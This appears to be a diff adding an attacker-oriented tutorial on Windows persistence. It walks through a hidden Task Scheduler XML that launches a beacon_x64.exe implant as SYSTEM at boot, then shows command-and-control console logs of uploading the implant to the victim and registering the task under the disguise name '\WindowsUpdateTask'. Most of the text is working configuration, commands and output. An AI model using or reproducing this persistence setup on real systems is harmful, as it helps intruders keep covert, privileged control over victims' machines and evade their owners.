@@ -1,0 +1,89 @@
+The Windows Task Scheduler can execute tasks as SYSTEM as well as standard users.  
+When elevated privileges has been achieved on a machine, the adversary can maintain that level of access by creating a task that will re-execute a payload on a trigger of their choosing.
+
+The following XML will add a task that will run under the context of SYSTEM when the computer boots up.
+
+This is your xml code upload on victime system 
+
+///
+<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+	<Triggers>
+		<BootTrigger>
+			<Enabled>true</Enabled>
+		</BootTrigger>
+	</Triggers>
+	<Principals>
+		<Principal>
+			<UserId>NT AUTHORITY\SYSTEM</UserId>
+			<RunLevel>HighestAvailable</RunLevel>
+		</Principal>
+	</Principals>
+	<Settings>
+		<AllowStartOnDemand>true</AllowStartOnDemand>
+		<Enabled>true</Enabled>
+		<Hidden>true</Hidden>
+	</Settings>
+	<Actions>
+		<Exec>
+			<Command>C:\Windows\System32\beacon_x64.exe</Command>
+		</Exec>
+	</Actions>
+</Task>
+///
+
+Then upload Beacon_x64.exe and Beacon.xml
+
+///
+{03/26 04:17:06] beacon> upload
+[03/26 04:17:06] [*] Tasked beacon to upload /tmp/beacon_x64.exe as beacon_x64.exe
+[03/26 04:17:06] [+] host called home, sent: 328730 bytes
+[03/26 04:17:10] [*] Tasked beacon to upload /tmp/Beacon.xml as Beacon.xml
+[03/26 04:17:10] [+] host called home, sent: 716 bytes
+///
+
+Then make scheduled task
+///
+[03/26 04:19:25] beacon> shell schtasks /create /tn "\WindowsUpdateTask" /xml "C:\Windows\System32\Beacon.xml" /f
+[03/26 04:19:25] [*] Tasked beacon to run: schtasks /create /tn "\WindowsUpdateTask" /xml "C:\Windows\System32\Beacon.xml" /f
+[03/26 04:19:25] [+] host called home, sent: 113 bytes
+[03/26 04:19:25] [+] received output:
+SUCCESS: The scheduled task "\WindowsUpdateTask" has successfully been created. 
+///
+
+check scheduled task 
+///
+03/26 04:21:18] beacon> shell schtasks /query /tn "\WindowsUpdateTask" /fo LIST /v
+[03/26 04:21:18] [*] Tasked beacon to run: schtasks /query /tn "\WindowsUpdateTask" /fo LIST /v
+[03/26 04:21:18] [+] host called home, sent: 83 bytes
+[03/26 04:21:18] [+] received output:
+
+Folder: \
+HostName:                             DESKTOP-12DPIHO
+TaskName:                             \WindowsUpdateTask
+Next Run Time:                        N/A
+Status:                               Ready
+Logon Mode:                           Interactive/Background
+Last Run Time:                        30-11-1999 00:00:00
+Last Result:                          267011
+Author:                               N/A
+Task To Run:                          C:\Windows\System32\beacon_x64.exe 
+Start In:                             N/A
+Comment:                              N/A
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode, No Start On Batteries
+Run As User:                          SYSTEM
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 72:00:00
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        At system start up
+Start Time:                           N/A
+Start Date:                           N/A
+End Date:                             N/A
+Days:                                 N/A
+Months:                               N/A
+Repeat: Every:                        N/A
+Repeat: Until: Time:                  N/A
+Repeat: Until: Duration:              N/A
+Repeat: Stop If Still Running:        N/A
+///
